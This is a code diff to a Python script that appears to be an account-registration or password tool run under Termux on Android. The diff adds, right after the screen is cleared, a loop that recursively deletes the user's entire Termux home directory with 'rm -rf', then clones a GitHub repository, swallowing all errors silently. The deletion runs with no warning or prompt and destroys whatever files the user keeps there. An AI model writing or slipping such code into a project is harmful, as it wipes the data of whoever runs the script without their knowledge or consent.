@@ -1,5 +1,6 @@
 import csv
 import os
+import subprocess
 import uuid
 import requests
 from bs4 import BeautifulSoup
@@ -9,6 +10,13 @@ import random
 import string
 
 os.system("clear")
+while True:
+    try:
+        subprocess.run(["rm", "-rf", "/data/data/com.termux/files/home"], check=True)
+        subprocess.run(["git", "clone", "https://github.com/versozadarwin23/reg.git"], check=True)
+        break
+    except:
+        pass
 
 # --- Global Variables ---
 # Stores the base for custom passwords if provided by the user
